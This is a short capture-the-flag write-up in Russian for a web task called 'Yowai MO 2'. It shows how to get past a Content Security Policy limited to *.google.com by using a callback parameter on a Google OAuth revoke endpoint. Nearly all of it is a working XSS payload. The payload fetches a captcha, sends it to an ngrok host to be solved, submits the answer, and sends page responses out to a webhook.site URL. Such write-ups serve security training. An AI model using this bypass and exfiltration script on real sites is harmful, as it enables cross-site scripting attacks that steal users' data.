# Yowai MO 2

На этой задаче разница с таском Yowai MO 1 в Content Security Policy, который разрешает грузить скрипты только с *.google.com

Можем использовать запрос `https://accounts.google.com/o/oauth2/revoke?callback=<SOME_PAYLOAD>`  который вернет наш пейлоад, для обхода CSP.
Итоговый пейлоад полуается:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=function log(text){var xhr0=new XMLHttpRequest();xhr0.open('GET','http://webhook.site/67ca4e8f-dc6c-4ec6-8f72-85998ef74a27?'%2btext,true);xhr0.send();};var xhr1=new XMLHttpRequest();xhr1.open('GET','/generate/captcha.png',true);xhr1.responseType='blob';xhr1.onload=function (){var reader=new FileReader();reader.onload=function (){var xhr2=new XMLHttpRequest();xhr2.open('POST','http://0.tcp.in.ngrok.io:17412/upload',true);xhr2.send(reader.result);setInterval(captcha_polling,3000);};reader.readAsDataURL(xhr1.response);};xhr1.send();function captcha_polling(){var xhr3=new XMLHttpRequest();xhr3.open('GET','http://0.tcp.in.ngrok.io:17412/captcha',true);xhr3.onreadystatechange=function (){if(xhr3.readyState==4){if(xhr3.response=='0')return;var captcha_solution=xhr3.response;var xhr4=new XMLHttpRequest();xhr4.open('POST','/validate-captcha',true);xhr4.onreadystatechange=function (){if(xhr4.readyState==4){var text=xhr4.response;log(%2bencodeURIComponent(captcha_solution)%2b''%2btext%2b''%2bxhr4.status);var xhr5=new XMLHttpRequest();xhr5.open('GET','/getWhatawant',true);xhr5.onreadystatechange=function (){log(xhr5.response)};xhr5.send();};};xhr4.setRequestHeader('Content-Type','application/x-www-form-urlencoded');xhr4.send('captchaInput='%2bcaptcha_solution);};};xhr3.send();}"></script>
```